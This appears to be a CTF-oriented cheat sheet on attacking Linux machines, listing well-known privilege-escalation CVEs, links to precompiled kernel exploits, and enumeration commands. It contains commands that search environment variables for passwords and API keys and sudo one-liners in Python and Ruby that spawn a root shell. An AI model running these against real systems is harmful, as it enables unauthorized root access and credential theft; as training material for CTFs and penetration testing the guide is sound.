# Attacking Linux Boxes

#### Most Common CVEs used on CTFs

| # | CVE                                                                     | Description                                                                           |
| - | ----------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| 1 | [Shellshock - CVE-2014-6271](https://www.exploit-db.com/exploits/34900) | Privilage esculation exploit. Can be used against CGI-Bin also.                       |
| 2 | [DirtyCow - CVE-2016-5195](https://dirtycow.ninja)                      | Privilege escalation vulnerability in the Linux Kernel. (Linux Kernel <= 3.19.0-73.8) |
| 3 | [SambaCry - CVE-2017–7494](https://redteamzone.com/EternalRed/)         | Also known as EternalRed. This is the EthernalBlue of Linux SMB File Servers.         |

#### Post Exploitation - Privilage Escalation

_Automated Tools:_

| Tool                                                                                                      | Description                                                                  |
| --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| [LinPEASS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) | A script that search for possible paths to escalate privileges on Linux/Unix |

### Manual Privilage Escalation

_Grabbing OS Information_

```
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null
```

_Checking $PATH for Write Permissions_ If you have **write permissions on any folder inside the `PATH` variable** you may be able to hijacking some libraries or binaries:

```
echo $PATH
```

_Checking Environment Variables_ Looking for interesting information, passwords or API keys in the environment variables.

```
(env || set) 2>/dev/null
```

_Enumerate Misconfigured `sudo`_ Run this command to see what programs you has access to using sudo.

```
sudo -l
```

_Exploiting Misconfigured `sudo`_

| # | Language | Commands                                              |
| - | -------- | ----------------------------------------------------- |
| 1 | Python   | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
| 2 | Ruby     | `sudo ruby -e 'system("/bin/bash")'`                  |
| 3 | NodeJS   | `node -e '[...]()'`                                   |

_NodeJS Privilage Exculation Script_

```
var exec = require('child_process').exec;
exec('[COMMAND]', function (error, stdOut, stdErr) {
console.log(stdOut);
});
```

### Kernel Exploits

Check the Kernel version for a possible CVE.

```
cat /proc/version
uname -a
```

_Searching for an exploit via SearchSploit_

```
searchsploit "Linux Kernel"
```

_Resources with Compiled Kernel Exploits_

| # | Resource                                                                                               | Description                                             |
| - | ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------- |
| 1 | [Lucyoa's Github](https://github.com/lucyoa/kernel-exploits)                                           | Linux Kernel Exploits, Precompiled.                     |
| 2 | [bwbwbwbw's GitHub](https://github.com/bwbwbwbw/linux-exploit-binaries)                                | List of very common Linux Kernel Exploits, Precompiled. |
| 3 | [Kabot's Privilege Escalation Packs](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack) | Another lsit of Linux Kernel Exploits, Precompiled.     |

## Resources Referenced

_Special Thanks to:_

| # | Name         | Resource                                                    |
| - | ------------ | ----------------------------------------------------------- |
| 1 | Carlos Polop | https://book.hacktricks.xyz/linux-unix/privilege-escalation |
